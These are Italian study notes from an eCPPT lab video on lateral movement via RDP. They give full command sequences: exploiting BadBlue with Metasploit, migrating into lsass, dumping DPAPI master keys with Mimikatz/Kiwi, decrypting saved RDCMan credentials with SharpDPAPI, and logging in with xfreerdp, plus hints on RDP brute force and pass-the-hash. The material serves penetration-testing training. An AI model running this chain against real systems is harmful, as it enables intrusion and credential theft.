# 07 — Lateral Movement via RDP

> **Modulo:** Lateral Movement & Pivoting · **Video:** 7/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [07_Lateral Movement via RDP.txt](07_Lateral Movement via RDP.txt) · [07_Lateral Movement via RDP.srt](07_Lateral Movement via RDP.srt)

## Concetti chiave

- **RDP (Remote Desktop Protocol)** = porta **3389**, accesso GUI a sistemi Windows.
- **RDP NON supporta Pass-the-Hash**: serve **clear-text password**.
- Il video mostra uno scenario di **lateral movement realistico**: compromise Victim 1 → estrazione credenziali RDP da file `.rdg` → uso su Victim 2.
- File **`.rdg`** = config del **Remote Desktop Connection Manager (RDCMan)** — contiene credenziali RDP **cifrate con DPAPI**.
- Decifratura con **SharpDPAPI** + master key DPAPI estratta con **Mimikatz/Kiwi** (`sekurlsa::dpapi`).
- Tool client RDP da Linux: **xfreerdp**.

## Spiegazione approfondita

### Scenario lab
- Victim 1: web server BadBlue 2.7 (buffer overflow, exploitabile con MSF).
- Victim 2: target finale, raggiungibile via RDP.
- Obiettivo: foothold su Victim 1 → trovare credenziali RDP per Victim 2 → laterally move.

### Catena di sfruttamento
1. **Initial access** Victim 1: exploit BadBlue (`exploit/windows/http/badblue_passthru`) → Meterpreter come `NT AUTHORITY\SYSTEM`.
2. **Local enumeration**: cerca file `.rdg` in `C:\Users\Administrator\Documents\`.
3. **Cat del .rdg**: rivela credenziali RDP per Victim 2 **ma cifrate (DPAPI)**.
4. **Upload SharpDPAPI** sul target.
5. **Esegui `SharpDPAPI.exe rdg`** → identifica che serve la master key DPAPI.
6. **Estrai master key DPAPI** con Mimikatz/Kiwi: `kiwi_cmd "sekurlsa::dpapi"` → ottieni GUID + SHA1 key.
7. **Esegui `SharpDPAPI.exe rdg /unprotect:<GUID>:<SHA1>`** → password in chiaro.
8. **`xfreerdp`** → login su Victim 2.

### DPAPI in breve
- **Data Protection API** Windows: cifra credenziali per-utente con master key derivata dalla password utente.
- File interessanti: `.rdg` (RDCMan), browser saved passwords, vault Windows.
- Per decifrare: serve **master key**, ottenibile via Mimikatz se hai accesso a LSASS.

## Comandi & strumenti

```bash
# Scan Victim 1
nmap -sS -sV -T4 <VICTIM1_IP>

# Metasploit: exploit BadBlue
msfconsole -q
search badblue
use exploit/windows/http/badblue_passthru
set RHOSTS <VICTIM1_IP>
exploit
# → Meterpreter, migra a lsass.exe (64-bit)
migrate -N lsass.exe

# Enumera documenti utente
cd C:\\Users\\Administrator\\Documents
ls
cat production_server.rdg
# → vede CredentialsProfile cifrata + ServerName=<VICTIM2_IP>

# Upload SharpDPAPI
upload /root/Desktop/tools/SharpDPAPI.exe

# Shell → esegui SharpDPAPI
shell
SharpDPAPI.exe rdg
# → "Master key needed" + GUID

# Estrai master key DPAPI con Kiwi (Mimikatz in Meterpreter)
load kiwi
kiwi_cmd "sekurlsa::dpapi"
# → output: GUID + MasterKey (SHA1)

# Decifra credenziali
SharpDPAPI.exe rdg /unprotect:<GUID>:<SHA1_MASTERKEY>
# → password in chiaro per Victim 2

# Connessione RDP da Kali
xfreerdp /u:administrator /p:<PASSWORD> /v:<VICTIM2_IP>
```

## Esempi pratici

```bash
# Esempio completo (dal video):

# 1. Exploit BadBlue
msfconsole -q
search badblue
use 1   # exploit/windows/http/badblue_passthru
set RHOSTS <VICTIM1_IP>
exploit
# → meterpreter session, migrate lsass.exe

# 2. Trova .rdg
cd C:\\Users\\Administrator\\Documents
ls
# → production_server.rdg, RDCMan.exe
cat production_server.rdg
# → <CredentialsProfile> ... <Password>...</Password> (cifrata DPAPI)
# → <Server>...<Name>VICTIM2_IP</Name>

# 3. Upload SharpDPAPI
upload /root/Desktop/tools/SharpDPAPI.exe

# 4. Triage RDG
shell
SharpDPAPI.exe rdg
# → triage: file rdcman.settings, profilo cred per administrator
# → "Master key needed" GUID={xxxx-xxxx-xxxx}

# 5. Master key con Kiwi
exit   # esce dalla shell
load kiwi
kiwi_cmd "sekurlsa::dpapi"
# → Session 1 Interactive | User: Administrator
#   MasterKey: <SHA1>
#   GUID: {xxxx-xxxx-xxxx}

# 6. Decifra
shell
SharpDPAPI.exe rdg /unprotect:{xxxx-xxxx-xxxx}:<SHA1_KEY>
# → Password: harry_123321

# 7. RDP a Victim 2 da Kali
xfreerdp /u:administrator /p:harry_123321 /v:<VICTIM2_IP>
# → desktop session Victim 2
```

## Punti d'attenzione per l'esame eCPPT

- **RDP = porta 3389, NO Pass-the-Hash** — domanda critica. Serve clear-text.
- **`.rdg` files = goldmine di credenziali RDP** salvate, ma cifrate DPAPI.
- **DPAPI master key extraction** = Mimikatz `sekurlsa::dpapi` (richiede privilegi SYSTEM o accesso a LSASS).
- **SharpDPAPI** = porting C# di Mimikatz DPAPI module — comodo come standalone.
- **xfreerdp** è il client RDP standard su Kali (alternativa: `rdesktop`, `remmina`).
- **Network Level Authentication (NLA)** può richiedere credenziali prima della sessione → se NLA è disabilitato si può anche brute-force RDP.
- Esempio classico esame: "Hai un hash NTLM, puoi loggarti via RDP?" → **No**, solo password chiare o tool tipo `xfreerdp /pth` (raramente supportato, dipende da Restricted Admin Mode).
- **RDP brute force**: tool `hydra rdp://`, ma più rumoroso.
- **Restricted Admin Mode** abilitato sul target → PTH-RDP è possibile (caso edge, ricordalo).

## Collegamenti con altri video

- Precedente: [[06_Lateral Movement with CrackMapExec]] — video in cui RDP veniva abilitato via modulo CME.
- Prossimo: [[08_Lateral Movement via WinRM]] — altro remote management protocol.
- DPAPI / Mimikatz: rivedere video di credential dumping nel corso di Post-Exploitation.
- Pass-the-Hash (per contrasto, NON funziona su RDP standard): [[09_Pass-the-Hash with Metasploit]]
